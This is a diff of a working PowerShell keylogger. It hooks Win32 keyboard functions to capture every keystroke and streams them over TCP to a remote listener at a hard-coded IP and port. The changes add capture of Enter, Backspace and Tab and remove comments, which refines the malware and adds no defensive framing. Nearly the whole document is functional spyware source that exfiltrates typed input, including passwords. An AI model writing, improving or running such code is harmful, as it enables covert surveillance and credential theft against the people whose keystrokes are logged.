@@ -1,9 +1,10 @@
 # Creator: Securethelogs | @Securethelogs
 # Modified for Network Stream by Venice
+# FIXED for Linux/Mac Terminals
 
 # --- Network Configuration ---
-$targetIP = "192.168.8.199" # Replace with your listener IP
-$targetPort = 4444          # Replace with your listener port
+$targetIP = "192.168.8.199"
+$targetPort = 4444
 
 # --- P/Invoke Signatures ---
 $signatures = @'
@@ -17,7 +18,6 @@ public static extern int MapVirtualKey(uint uCode, int uMapType);
 public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);
 '@
 
-# Load the API functions
 $API = Add-Type -MemberDefinition $signatures -Name 'Win32' -Namespace API -PassThru
 
 # --- Network Connection Setup ---
@@ -26,12 +26,11 @@ try {
     $client = New-Object System.Net.Sockets.TcpClient($targetIP, $targetPort)
     $stream = $client.GetStream()
     $writer = New-Object System.IO.StreamWriter($stream, [System.Text.Encoding]::Unicode)
-    $writer.AutoFlush = $true # IMPORTANT: Send data immediately
+    $writer.AutoFlush = $true
     $writer.WriteLine("=== Keylogger Started ===")
     Write-Host "Connected. Logging keys." -ForegroundColor Green
 } catch {
     Write-Host "CONNECTION FAILED: $($_.Exception.Message)" -ForegroundColor Red
-    # Exit if connection fails, as there's no point in continuing
     return
 }
 
@@ -40,29 +39,40 @@ try {
     while ($client.Connected) {
         Start-Sleep -Milliseconds 40
 
-        for ($ascii = 9; $ascii -le 254; $ascii++) {
-            # GetAsyncKeyState returns -32767 on a key press transition
+        # --- Handle Special Keys First ---
+        if ($API::GetAsyncKeyState(13) -eq -32767) { # Enter Key
+            $writer.Write("[ENTER]`n") # <--- FIX: Send LF only
+            continue
+        }
+        if ($API::GetAsyncKeyState(8) -eq -32767) {  # Backspace Key
+            $writer.Write("[BACKSPACE]`n") # <--- FIX: Send LF only
+            continue
+        }
+        if ($API::GetAsyncKeyState(9) -eq -32767) {  # Tab Key
+            $writer.Write("[TAB]`n")
+            continue
+        }
+
+        # --- Handle All Other Keys ---
+        for ($ascii = 32; $ascii -le 254; $ascii++) {
+            # Skip keys we already handled
+            if ($ascii -eq 13 -or $ascii -eq 8 -or $ascii -eq 9) { continue }
+
             $state = $API::GetAsyncKeyState($ascii)
-
             if ($state -eq -32767) {
-                # This check is a bit of a hack to ensure a fresh read
                 $null = [console]::CapsLock
-
                 $virtualKey = $API::MapVirtualKey($ascii, 3)
                 $kbstate = New-Object -TypeName Byte[] -ArgumentList 256
                 $checkkbstate = $API::GetKeyboardState($kbstate)
                 $mychar = New-Object -TypeName System.Text.StringBuilder
-
-                # Convert the virtual key code to a unicode character
                 $success = $API::ToUnicode($ascii, $virtualKey, $kbstate, $mychar, $mychar.Capacity, 0)
 
-                # If conversion was successful, send the character
                 if ($success) {
                     try {
                         $writer.Write($mychar.ToString())
                     } catch {
                         Write-Host "Connection lost while sending data." -ForegroundColor Red
-                        throw # Exit the 'while' loop
+                        throw
                     }
                 }
             }
